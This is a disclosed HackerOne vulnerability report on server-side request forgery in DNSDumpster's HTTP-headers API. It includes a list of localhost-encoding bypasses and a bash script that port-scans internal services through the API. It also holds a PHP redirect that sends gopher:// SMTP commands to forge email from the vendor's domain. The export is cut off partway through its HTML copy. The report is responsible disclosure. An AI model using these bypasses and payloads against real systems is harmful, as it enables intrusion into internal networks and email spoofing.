{"id":392859,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTI4NTk=","url":"https://hackerone.com/reports/392859","title":"Sending Emails from  DNSDumpster - Server-Side Request Forgery to Internal SMTP Access","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-11-17T19:18:17.000Z","submitted_at":"2017-11-17T19:18:17.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cdl","url":"/cdl","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":31821,"url":"https://hackerone.com/hackertarget","handle":"hackertarget","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/031/821/616f439956256fb9d7ead5105664278e5cc39706_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"profile":{"name":"Hacker Target","twitter_handle":"","website":"https://hackertarget.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":true,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-10T21:40:02.757Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\n| Summary: |\n| -- |\n[HackerTarget](https://hackertarget.com/) is a service that provides access to online vulnerability scanners and tools used by many security professionals and “makes securing your systems easier”. They also are the creators of [DNSDumpster](https://dnsdumpster.com/) which is a popular service used for recon.\n\n| Description: |\n| --|\n\u003e Server-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request **is not** a vulnerability in itself, but it \n becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.\n\nIn [DNSDumpster](https://dnsdumpster.com/), there is a function to \"Get HTTP Headers\" for a specific host.  \n\n{F331105}\n\nThis function makes a call to the API at `https://api.hackertarget.com/httpheaders/?q=\u003ctarget\u003e` and it displays the HTTP Headers of a simple **HEAD** request sent from HackerTarget to the target server.\n\nThe `?q=` parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.\n\n| Proof-of-Concepts |\n| -- | \n\n# Initial Proof-of-Concept:\nMy initial proof-of-concept was extremely bland and I didn't put very much effort into it:\n\n- `https://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22`\n\n{F331111}\n\n\nThey thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string \"127.0.0.1\" and \"localhost\", which was easily bypassed using different encodings that would still resolve to localhost.\n\nExamples :\n\n```\n0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n```\n\nThere isn’t a solid way to validate hostnames just by using *string-based* checks, so my suggested mitigation was to resolve all hosts provided in the `?q=` parameter  and check them against local IP ranges.\n\n\nAbout a week and a half later:\n\n \u003e  “It is on my todo list. Not critical though as there are no local services that could be hit with it.”\n\n\n# Proof of Concept: Hitting Local Services.\nI attempted to enumerate different ports that internal services could be running on, even though there were none \"that could be hit with it.\"\n\n```\n#!/usr/bin/env bash\nfor port in `seq 1 9999`\ndo\n\techo -e \"\\n\\n[+] Checking Port: \"$port\"\\n\"\n\tcurl 'https://api.hackertarget.com/httpheaders/?q=http://'$1':'$port \u0026\u0026 echo -e \"\\n\"\ndone\n```\n\n```\n➜ cdl@skid   ~ chmod +x ht.sh \u0026\u0026 ./ht.sh 0177.1\n```\n\nThis spat out the following response: \n\n{F331112}\n\nThere was an internal SMTP server running on the standard port.\n\n**SMTP:**\n-   SMTP stands for Simple Mail Transfer Protocol.\n-  It is a TCP/IP protocol that’s used for **sending emails**.\n\nIn order to be able to send emails with SMTP we have to first have to know how mail transactions work:\n\n1. SMTP sessions are initiated after the **client** opens a TCP/IP connection to the server and the **server** responds with a greeting (220)\n2. The **client** sends a `HELO` or `EHLO` with the clients identity (example: `HELO hackertarget.com` which means \"Hi I'm hackertarget.com\")\n3. Now the client has to perform 3 steps each separated by a **CRLF** for a valid SMTP mail transaction:\n    - Step 1: `MAIL`: This tells the server \"Hey, we're starting a new email, reset your state\". This is where the email \"from\" is specified.\n    - Step 2: `RCPT`: Tells the server where (who) we want to send the email too.\n    - Step 3: `DATA`: This is where the Subject and body of the email are set, and the client indicates the end of the mail data by a new line containing only \".\". This tells the server that the client confirms the email and tells the server to process it and send it.\n\n   \nHere's a visualization of the structure of SMTP from [RFC 5321](https://tools.ietf.org/html/rfc5321):\n\n```\n                  +----------+                +----------+\n      +------+    |          |                |          |\n      | User |\u003c--\u003e|          |      SMTP      |          |\n      +------+    |  Client- |Commands/Replies| Server-  |\n      +------+    |   SMTP   |\u003c--------------\u003e|    SMTP  |    +------+\n      | File |\u003c--\u003e|          |    and Mail    |          |\u003c--\u003e| File |\n      |System|    |          |                |          |    |System|\n      +------+    +----------+                +----------+    +------+\n                            Email client                     SMTP server\n```\n\nThe SMTP Client was the \"Get HTTP Headers\" function of the API and the the SMTP Server was the service running on an internal port.\n\n\n# Leveraging the SSRF to send emails:\nThe API function was using libcurl to execute the requests *and* it was following redirects. The libcurl library supports an overabundance of protocols including `gopher://` which essentially sends 1 character, a new line (CR+LF), and the remaining data, which allows people to send a multiline requests. This means we can use gopher to send valid commands to the SMTP server and send emails.\n\n\n\n- http://\u003cserver\u003e/mail.php:\n\n```\n\u003c?php\n        $commands = array(\n                'HELO hackertarget.com',\n                'MAIL FROM: \u003cadmin@hackertarget.com\u003e',\n                'RCPT To: \u003ccdl@oou.us\u003e',\n                'DATA',\n                'Subject: corben!',\n                'Corben (cdl) was here, woot woot!',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n?\u003e\n```\n\nThis responds with a 302 redirect to the internal SMTP server with the valid commands to send an email.\n\n\nI confirmed it worked by visiting the following URL:\n- https://api.hackertarget.com/httpheaders/?q=http://\u003cserver\u003e/mail.php \n\nI checked my email (cdl@oou.us) and I had an email from `admin@hackertarget.com` with the subject \"corben!\" and the body \"Corben (cdl) was here, woot woot!\"\n\nHere's the proof-of-concept video:\n- https://www.youtube.com/watch?v=F_sC_OrSkIc\n\n\n| Impact | \n|--| \nAn attacker could access internal networks and internal services. I could have sent valid emails from and as HackerTarget.\n\n\n\nThanks,\nCorben Leo (@cdl)\n- https://hacking.us.com\n- https://twitter.com/hacker_","vulnerability_information_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eSummary:\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fhackertarget.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHackerTarget\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is a service that provides access to online vulnerability scanners and tools used by many security professionals and “makes securing your systems easier”. They also are the creators of \u003ca href=\"/redirect?url=https%3A%2F%2Fdnsdumpster.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eDNSDumpster\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which is a popular service used for recon.\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDescription:\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eServer-Side Request Forgery (SSRF) is a vulnerability in which an attacker can send a controlled, crafted request via a vulnerable application. We can communicate with different services running on different protocols by utilizing URI schemes. Getting a server to issue a request \u003cstrong\u003eis not\u003c/strong\u003e a vulnerability in itself, but it \u003cbr\u003e\n becomes one when you can make requests to things you wouldn’t or shouldn’t normally have access to, such as internal networks or internal services.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eIn \u003ca href=\"/redirect?url=https%3A%2F%2Fdnsdumpster.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eDNSDumpster\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, there is a function to \u0026quot;Get HTTP Headers\u0026quot; for a specific host.  \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-httpheaders.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?response-content-disposition=attachment%3B%20filename%3D%22ht-httpheaders.png%22%3B%20filename%2A%3DUTF-8%27%27ht-httpheaders.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=cc9a936c42ec454ebdababc3af5ad1b7917b79d54acadb1ef03dd66320be05a1\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/105/cbeb6cf1e1d48168beb1d8c01d951d2032e5d6a4/ht-httpheaders.png?response-content-disposition=attachment%3B%20filename%3D%22ht-httpheaders.png%22%3B%20filename%2A%3DUTF-8%27%27ht-httpheaders.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=cc9a936c42ec454ebdababc3af5ad1b7917b79d54acadb1ef03dd66320be05a1\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis function makes a call to the API at \u003ccode\u003ehttps://api.hackertarget.com/httpheaders/?q=\u0026lt;target\u0026gt;\u003c/code\u003e and it displays the HTTP Headers of a simple \u003cstrong\u003eHEAD\u003c/strong\u003e request sent from HackerTarget to the target server.\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e?q=\u003c/code\u003e parameter was vulnerable to SSRF due to the absence of proper checks and firewalls.\u003c/p\u003e\n\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eProof-of-Concepts\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\n\u003ch1 id=\"initial-proof-of-concept\"\u003eInitial Proof-of-Concept:\u003c/h1\u003e\n\n\u003cp\u003eMy initial proof-of-concept was extremely bland and I didn\u0026#39;t put very much effort into it:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttps://api.hackertarget.com/httpheaders/?q=http://127.0.0.1:22\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-ssh.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?response-content-disposition=attachment%3B%20filename%3D%22ht-ssh.png%22%3B%20filename%2A%3DUTF-8%27%27ht-ssh.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=8e63ffc679516a16ad19f1874e2efb2d71591019e670a5bfef83f5df2e0f3979\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/111/c83108b2369b854670d9591934992ddd440c8ab6/ht-ssh.png?response-content-disposition=attachment%3B%20filename%3D%22ht-ssh.png%22%3B%20filename%2A%3DUTF-8%27%27ht-ssh.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=8e63ffc679516a16ad19f1874e2efb2d71591019e670a5bfef83f5df2e0f3979\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThey thanked me and attempted to patch. However, the patch was merely a regular expression that was checking for the string \u0026quot;127.0.0.1\u0026quot; and \u0026quot;localhost\u0026quot;, which was easily bypassed using different encodings that would still resolve to localhost.\u003c/p\u003e\n\n\u003cp\u003eExamples :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e0\n127.00.1\n127.0.01\n0.00.0\n0.0.00\n127.1.0.1\n127.10.1\n127.1.01\n0177.1\n0177.0001.0001\n0x0.0x0.0x0.0x0\n0000.0000.0000.0000\n0x7f.0x0.0x0.0x1\n0177.0000.0000.0001\n0177.0001.0000..0001\n0x7f.0x1.0x0.0x1\n0x7f.0x1.0x1\nlocaltest.me\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere isn’t a solid way to validate hostnames just by using \u003cem\u003estring-based\u003c/em\u003e checks, so my suggested mitigation was to resolve all hosts provided in the \u003ccode\u003e?q=\u003c/code\u003e parameter  and check them against local IP ranges.\u003c/p\u003e\n\n\u003cp\u003eAbout a week and a half later:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e“It is on my todo list. Not critical though as there are no local services that could be hit with it.”\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch1 id=\"proof-of-concept-hitting-local-services\"\u003eProof of Concept: Hitting Local Services.\u003c/h1\u003e\n\n\u003cp\u003eI attempted to enumerate different ports that internal services could be running on, even though there were none \u0026quot;that could be hit with it.\u0026quot;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/usr/bin/env bash\u003c/span\u003e\n\u003cspan class=\"k\"\u003efor \u003c/span\u003eport \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"nb\"\u003eseq \u003c/span\u003e1 9999\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003cspan class=\"k\"\u003edo\n    \u003c/span\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nt\"\u003e-e\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e[+] Checking Port: \u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$port\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n    curl \u003cspan class=\"s1\"\u003e\u0026#39;https://api.hackertarget.com/httpheaders/?q=http://\u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$port\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nt\"\u003e-e\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜ cdl@skid   ~ chmod +x ht.sh \u0026amp;\u0026amp; ./ht.sh 0177.1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis spat out the following response: \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ht-postfix.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/331/112/3d29af60f85640c53af07837d82639a36e14df95/ht-postfix.png?response-content-disposition=attachment%3B%20filename%3D%22ht-postfix.png%22%3B%20filename%2A%3DUTF-8%27%27ht-postfix.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3BIZ4JTU%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T055000Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCqQsLMvYqK8Fn0GTGiLsXz5M8tY4soJZygdoXv5QEQAIgCyKzbKJdYVXE7%2F2vaqKKjTCLEh%2Fh%2BJKa%2B0XuR0hsEFUqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDLR6kgVshwHIKyeb6iqRA2MFJpPkZrhx3t6AejIGud%2FxGIWTN2PoGCZioXicg1VZZgMq5uaPSAxNNXocaSomclyhf%2B4rJe2NLnNAFrXhEGbulvXBmkmO3c%2BD1qqEXyp6qcE41xoYCshBNytJdSH%2BZLTkpaCox4H3NJ6CH%2Bfflh7STpyLJOhPOuoFBY2ARN4mLdeBNYSs61C8zzgM1WQDBhFMxgMb7vKIJ1dmuPynnD4cKxw%2FWKOaq4NfJudL5XP2lTarTb4xTPf3vkoagtHONFoVfop3fmgabccyD5073szNTxXapdwAVZzs9R7zo8NryIyGlYETmxKma4s0cUHjxtmLxK48pLT0PIi7RZmyxoES3J9QTPpynp9iBtI5QalJxwB2tncxj9MMn9FCqJ1bzmYGaodAVxgE3jvslHp5jSM%2Fa1ljSf8SmNJrP91wkWRf4uVZMFej6WQDf8glru%2BoEB1%2FYut3mcF783rDVabhOcofZMw%2BHz6ACFg0WnuWtpGqDpIcX0PQQ%2FoYL%2BmsAiBEElGWlx6CHhWkYkEEJRUVb4ZXMK38qf8FOusBe7etUydbe6JZ8fKykaXtOPxCu8iTA%2FElzyhp13PbtTDj33DNPynSKOmKukTuY24fr3DCAPr5hsRSqBR1%2Ba8d9PI2IvIU4Avj2sJzGWzPQZqC0yDuDhW7b1Hlw1obEAxs3X5bDEbon1OT%2FNhVXLOjpX6Tgp0e%2FX9uw%2FNELi9ZDp%2F4R20Hnj3eXjNGpomDVtKhE43xUUHq1cwYK5VNgPoPIFeCXGybJOtMWcGWoFDEfI0CPBvkCnoRsX0aaemkRB8e4CYE0aYJNO%2BizSsaZzOxO9oeciDAN9toV%2BloBz7WYCb61lChRw6E6vCQyg%3D%3D\u0026amp;X-Amz-Signature=917370f52830f0187be02a22b9